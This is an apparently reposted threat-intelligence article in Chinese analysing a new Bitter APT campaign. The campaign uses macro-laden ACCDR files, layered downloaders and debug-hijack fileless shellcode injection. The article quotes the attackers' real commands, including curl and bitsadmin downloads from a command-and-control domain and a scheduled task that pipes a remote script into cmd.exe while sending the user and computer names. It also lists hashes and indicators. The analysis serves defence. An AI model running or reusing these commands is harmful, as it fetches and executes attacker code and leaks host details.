---
title: 零检出威胁再升级：蔓灵花APT2026新型攻击链与高级逃逸技术深度分析
url: https://mp.weixin.qq.com/s/h_G2AL9-QyKfyixXV3QrfQ
source: Doonsec's feed
date: 2026-04-03
fetch_date: 2026-04-04T04:15:20.469327
---

# 零检出威胁再升级：蔓灵花APT2026新型攻击链与高级逃逸技术深度分析

![cover_image](http://mmecoa.qpic.cn/mmecoa_jpg/w6Du02ZmtvEkzFEM1mzEEAb79LGqxl9RGnueDzgfbN5JYOF9iaib01rNF7wtxpianpGdzuyr5ibqqGNDmgHnibkeVhFJwEsfxawmghKJvNJoicvcg/0?wx_fmt=jpeg)

# 零检出威胁再升级：蔓灵花APT2026新型攻击链与高级逃逸技术深度分析

VenusEye威胁情报
VenusEye威胁情报

VenusEye服务号

![]()

在小说阅读器中沉浸阅读

**0****1**

**事件概述**

近日，启明星辰 VenusEye 威胁情报中心成功捕获到蔓灵花组织新一轮攻击活动。相较该组织历史攻击行为，本轮攻击在载荷投递方式、执行流程设计及隐蔽对抗策略上均实现显著升级。组织启用全新多阶段载荷分发模式，依托模块化、分层式恶意代码植入体系，显著提升攻击复杂度与逃逸成功率，对政企机构终端安全防护与核心数据安全构成全新严峻威胁。

## **本次攻击核心升级特征如下：**

一、采用 2026 年全新攻击模式 ACCDR 格式文件实施攻击，具备优异的免杀对抗能力，截至分析时点，该样本在 **Virustotal（VT）平台检测率仍保持为 0**。

**二、攻击流程全面迭代升级：**摒弃以往直接下发远控木马的简易流程，新增多层中间下载器木马，进一步延长攻击链路，强化攻击隐蔽性；同时采用在线多阶段载荷拉取模式，有效压缩攻击暴露面，便于攻击者动态更新、回撤后置载荷，大幅提升攻击实战效能。

三、搭载基于开源项目 DbgNexum 改造的调试注入器组件，**首次在攻击活动中落地 “Windows 调试劫持 + 无文件远程线程注入” 高级 Shellcode 执行技术，**实现对主流安全防护产品的有效绕过。通过进程间数据共享、调试劫持配合无文件远程线程注入执行恶意代码，该技术设计思路精巧，检测规避能力突出。

**四、构建多层级隐蔽执行防护体系：**依托 ACCDR 文件无需交互即可执行宏代码的特性、（新增使用）系统原生工具 bitsadmin /transfer 的隐蔽下载能力，结合长链路在线载荷拉取、多层数据加密、计划任务延时执行、文件名与进程名伪装（蓝牙相关文件名伪装、fsquirt.exe 蓝牙进程伪装）等多重细节对抗手段，实现全维度检测规避，高度契合APT组织 “长期静默潜伏、持续窃密” 的核心作战目标。

**0****2**

**详细分析**

#

## ****攻击流程图：****

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvFeAFodnQ9hYgNiabtNGiaZmjYBtXr49oegI9oXGicQSgAULqpFcjEQermhJIsDx0NkQqAXS7qwiaeDzKHQlkY7z2MjlAYIjq3arTo/640?wx_fmt=png&from=appmsg)

## **样本分析**

#### **零检出的ACCDR文件攻击（无需用户交互隐蔽执行）** ACCDR是 Microsoft Access 专用的运行时数据库文件格式，常用于构建关系型数据库。该类文件默认以**只读模式**创建（后缀 r 代表 Read-only），仅支持打开查看，无法直接编辑修改。攻击者正是利用这一特性，将恶意宏代码隐匿其中，使其在用户无感知的情况下自动执行，实现高度隐蔽的恶意行为。此类攻击文件自 2026 年 1 月起被蔓灵花组织正式启用并广泛应用于实战攻击，截至当前分析时点，相关样本在 VirusTotal 平台仍保持**零检测率**，具备极强的免杀与对抗检测能力。

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvGIXLXbPr7S4OUdE6YRs554Kpnw4icOaONiaZNmiazicGicDOuHIzmDu79w65ZC16xmtbLvXO8GAfJK1IIOAtwBpVWW3o4ZkXoMPGSs/640?wx_fmt=png&from=appmsg)

|  |  |
| --- | --- |
| MD5 | 90565c899bbf800a69de9f41cf691737 |
| Filename | Maritime Domain Awareness.accdr  （译：海事态势感知 / 海洋领域态势感知） |

**基于文件名推测攻击目标指向海事相关行业。**

恶意代码嵌入Access数据库，通过AutoExec自动执行子程序（Access启动时自动触发），完成核心恶意操作，并通过伪装Office位数不兼容报错信息，掩盖攻击行为。整体设计贴合蔓灵花组织“隐蔽执行、规避检测”的攻击特点，与本次攻击的多阶段隐蔽策略高度契合。

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvFCWEiamf0qg9zm0PmwoJT4siaBzic1Nrm2r18FVRgeaDTOicxI8riaYibgKQXXX9yiakCXeSdxRpDppBziaAkNfXjYicPX0mAfozHqPUTU/640?wx_fmt=png&from=appmsg)

详细功能分析：

1、Base64解码出cmd命令行，并以"vbHide"隐藏模式执行；区别于以往直接下载拉取远控木马，在本次攻击中，下载到的为中间阶段下载器木马：conhost --headless cmd /c "cd C:\\ProgramData && curl -k -s http://bravojacksonmentor.com/bluetooth.txt -o .\\bluetooth.txt && copy /Y%windir%\\System32\\fsquirt.exe .\\ && timeout 5 && move /Y .\\bluetooth.txt bthprops.cpl && timeout 5 && start /min fsquirt"

![](https://mmecoa.qpic.cn/sz_mmecoa_png/w6Du02ZmtvETWrTMPicibLXMYKr5DcdvaPRmfskicW52DMHV8BAJxe6KqZl1VN6WLsz0ibqtdeN3BthuNaDm8vVbLMOdA9CpQqr117LGtG3uGXM/640?wx_fmt=png&from=appmsg)

2、弹框迷惑用户，降低用户警惕性：

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvE67JWicGDsfBgeHG6OibETEsPQ9U2qdx08OsaI9rOFZlEl05z0TovL21bGeksrXpJAVib5AZyCZjBhCoOWnAel9zk5uTyiaC3DpK0/640?wx_fmt=png&from=appmsg)

#### **第一层下载器木马--调用Windows 系统自带的命令行工具执行下载**

|  |  |
| --- | --- |
| URL | http://bravojacksonmentor.com/bluetooth.txt |
| MD5 | 0dc4e8723e7860aeaf420cd644c8b1db |
| Filename | bluetooth.txt、fsquirt.exe |
| 释放目录 | C:\ProgramData\bluetooth.txt %windir%\System32\fsquirt.exe |

1、数据解密：

关键数据采用基于xor的解密算法。不同的数据xor key有所不同，但整体解密逻辑一致：

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvFx5MC2nnYcDqEqlatiaNBRdlV3yPJvEktHicD6MMGkWqAPd8p8w93t9KHBGWmyA1yDUSR6Yt8XSSF46NOCLmZPlhiafELc89Fw60/640?wx_fmt=png&from=appmsg)

解密出的数据：

|  |  |
| --- | --- |
| 字符串含义 | 解密的字符串 |
| 下载释放路径字符串 | “C:\\ProgramData\\winocb.txt” |
| 下载文件URL | "https://bravojacksonmentor.com/winocb.txt" |
| 进程名 | "fsquirt.exe" |

2、拼接cmd命令行，并通过创建进程方式执行cmd命令：

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvFudKHvU07fErtqrSzic2oQvCOQ7ianN0Zwqq89DgsicMRbzg1LGiahJzHrbHk8z6NyuW3ibfJcLsNw1YIRlZJwx572cRhwZiakGbprI/640?wx_fmt=png&from=appmsg)

命令行功能为下载指定文件并释放到C:\ProgramData\winocb.txt；命令行如下：

bitsadmin /transfer mydownloadjob /download /priority normal "https://bravojacksonmentor.com/winocb.txt" "C:\ProgramData\winocb.txt"

bitsadmin /transfer是 Windows 系统自带的命令行工具（Background Intelligent Transfer Service，后台智能传输服务），核心功能是在后台异步传输文件（支持HTTP/HTTPS/FTP 等协议），默认无界面、低优先级，不易被用户和安全软件察觉。

3、sleep调用休眠后执行后续操作：规避检测；

4、拼接进程路径以及进程PID（进程遍历获取），创建进程模式执行 ：

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvFU4wBpgo5icOxCUqpwCkic5bGEAK86sSuVEvCOtI9Vxvuupq9aqHrZ9AOZqvvXzxB66oTNkjdNYE9cQ3fJj7S5OQrsklv1GRLa4/640?wx_fmt=png&from=appmsg)

#### **第二层下载器--Windows 调试劫持 + 无文件远程线程注入实现Shellcode执行**

|  |  |
| --- | --- |
| URL | https://bravojacksonmentor.com/winocb.txt |
| MD5 | e25095de50ef896946466f7f5dd47f1a |
| Filename | winocb.txt |
| 释放目录 | C:\ProgramData\winocb.txt |
| PDB | C:\Users\Montag\source\repos\wnshlc\x64\Release\wnshlc.pdb |

基于溯源发现该木马参考开源项目DbgNexum而来。在本层下载器木马中，该组织首次在攻击中启用“Windows 调试劫持 + 无文件远程线程注入”的高级 Shellcode 执行技术，用于绕过杀软，实现隐蔽执行。

PDB信息（其中wnshlc 疑似是Windows Shellcode Loader / Windows Shellcode Launcher缩写）：

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvE5U40nyrh8BRiaFzDpY0ibo6D4toA4RCBUwvDaL9cY9YLf649icRyvA4JJP0jzCRF6SKv4cerodiaric4icDicY3cWOndib1pPIfgbdGY/640?wx_fmt=png&from=appmsg)

功能分析：

1、Shellcode数据解密：基于与上文一致的解密逻辑：xor解密算法：

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvEXvtpXEToIOibHCtYA3KynicDetuZVMguVMwbetCdqgtnfxwU0RXXUj6Ja8icXo7N9hTgE4yCj1grQx71am6uDQH2rEeAiaxSD0q0/640?wx_fmt=png&from=appmsg)

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvGTQUpCFZxCDO8GS8IgKyVHlBm5hyiaUgW7Diabv0SicIT6dbSdNib2SpJOExXHV2HlnI81XJ9XhUEcLqjYgbKhQ0NlfRJqeBHqDCQ/640?wx_fmt=png&from=appmsg)

2、创建名为 “MZ” 的命名共享内存区域，并将 Shellcode 写入该映射空间，为进程间数据共享做准备；后续目标进程通过内存映射接口访问并读取该 Shellcode 载荷。

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvHD5IiagYwsOv740aLyuVTCfXAuf3APj5t4sDXx3SG7Lib9fRqHSrZ4Izp4YvcHlhB8314dBpRTiaW7ic5Oofc5x2z49mfxDicdFrYs/640?wx_fmt=png&from=appmsg)

3、将当前进程作为目标进程（fsquirt.exe）的调试器，获取线程执行控制权。通过获取目标进程内 FileTimeToSystemTime 函数地址，将其设置为注入远程线程执行入口（虚假入口），并在该位置下硬件断点以劫持执行流程。

![](https://mmecoa.qpic.cn/sz_mmecoa_png/w6Du02ZmtvF3DhorRusYsDT3Aq8pCWRXqTXURGbRkXyOwXKIjZEQFCvN2aVE4JGTWTU9tDTuLVv1ELLG6xN98Q4gSR9Cl16MAP5ggeJJJOg/640?wx_fmt=png&from=appmsg)

4、调试劫持 + 无文件远程线程注入执行的核心代码：

通过标志位flag的设置严格控制整个代码执行流程，通过多次的context设置与参数传递，配合调试器事件触发实现分步执行。同时由于执行的均为合法API规避了杀软检测，具备优秀的反检测效果。

![](https://mmecoa.qpic.cn/sz_mmecoa_png/w6Du02ZmtvFB2NMLxcmgWSIicAfmuPQicSHKBRKqbLRKVk19Mfu8YVgibRkPfkoETutccgibvRqcNFibgtVIR054EIIib5IeYtjK27xiaPIbjU0YQM/640?wx_fmt=png&from=appmsg)

执行顺序：

LocalAlloc调用--memcpy调用--memset调用--OpenFileMappingA调用--MapViewOfFile调用--Shellcode执行。

Shellcode获取逻辑：巧妙设计获取“MZ”字符串用于定位共享内存，目标进程通过 OpenFileMappingA 打开该命名映射，再通过 MapViewOfFile 将存储 shellcode 的共享内存映射至自身地址空间并执行。

![](https://mmecoa.qpic.cn/sz_mmecoa_png/w6Du02ZmtvH1ia9FJvHlicY7TG5koBichUM9myy4VfCOiadhnnSyicLHpW1qBQicpCG9gvmjOyF0SgF48yicYDmKp6Ns5IVxyL69TvlnQXx1uIfu0g/640?wx_fmt=png&from=appmsg)

#### 被注入执行的Shellcode

载荷执行阶段使用基于 PEB 模块遍历动态获取 WinExec 函数地址的 Shellcode，进一步减少静态特征，提升整体对抗检测能力。

![](https://mmecoa.qpic.cn/sz_mmecoa_png/w6Du02ZmtvH8cLMib7pyC052LzO7T7BGmeJmzqh8BXFoKMau5WuictJqho2VYNTyMWteeKMvibXbuXzcb1sM524d2PQVxHMnXicDu3CFHF9vaEQ/640?wx_fmt=png&from=appmsg)

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvEoViaicB4upxcgScJVEC7wmuSsK2s0GQEFLsiavGeVbsfYicMckibkiaQyfURAzXib023FnWjecZ5n67TKm4d3Ezv1HbRJqE1yibM5Ppo/640?wx_fmt=png&from=appmsg)

**参数：**

"schtasks /create /sc minute /mo 15 /f /tn \"MSIUtilHeader\" /tr \"conhost--headless cmd /c curl www.bravojacksonmentor.com/caw.php?uq=%username%\_%computername% | cmd.exe"

创建计划任务拼接本机用户名、计算机名信息获取后置载荷执行。

![](https://mmecoa.qpic.cn/mmecoa_png/w6Du02ZmtvFvxH70OxTQLEXicVvngrAaicHIArngiautOKztLJFM1HsktkeZXtbJlxiceicufndgNGqyl8fV5DqDiaXcJybV2Mhlia3ibAUibr1ibViaWQ/640?wx_fmt=png&from=appmsg)

**0****3**

**溯源关联**

### **溯源**

经分析判定为蔓灵花组织的最新攻击。归因特征与技术更新如下：

一、攻击模式归因：ACCDR类型文件攻击

该模式最早在2026年年初启用，早期攻击样本直接在payload载荷中拼接用户信息上传并下载后置远控木马，同时弹窗迷惑用户，与本次攻击存在代码和行为重合。但与早期样本相比本次攻击更为复杂，攻击链做了加长处理。

攻击流程对比：

![](https://mmecoa.qpic.cn/sz_mmecoa_png/w6Du02ZmtvEnKQsibTMzGWCHiaPmYkThMD7X9czYQIICVcr1bISblL9F9iabJgbXgfTH9jY49yOrsENsueMKPJvAaBjhgNHBico...